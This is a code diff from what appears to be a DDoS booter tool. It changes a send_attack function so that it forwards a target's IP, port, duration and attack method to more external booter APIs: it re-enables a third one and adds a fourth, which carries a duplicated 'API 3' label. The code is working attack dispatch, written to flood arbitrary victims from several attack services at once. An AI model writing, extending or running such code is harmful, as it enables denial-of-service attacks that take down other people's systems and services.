@@ -106,9 +106,13 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     console.log(rreturn1);
     response += "API 2: " + await func.get_api_response(rreturn1) + "\r\n";
 
-    // let rreturn2 = await(await fetch(config.BOOTERAPI3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    // console.log(rreturn2);
-    // response += "API 3: " + await func.get_api_response(rreturn2) + "\r\n";
+    let rreturn2 = await(await fetch(config.BOOTERAPI3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn2);
+    response += "API 3: " + await func.get_api_response(rreturn2) + "\r\n";
+
+    let rreturn3 = await(await fetch(config.BOOTERAPI4 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn3);
+    response += "API 3: " + await func.get_api_response(rreturn3) + "\r\n";
     return response;
 }
 
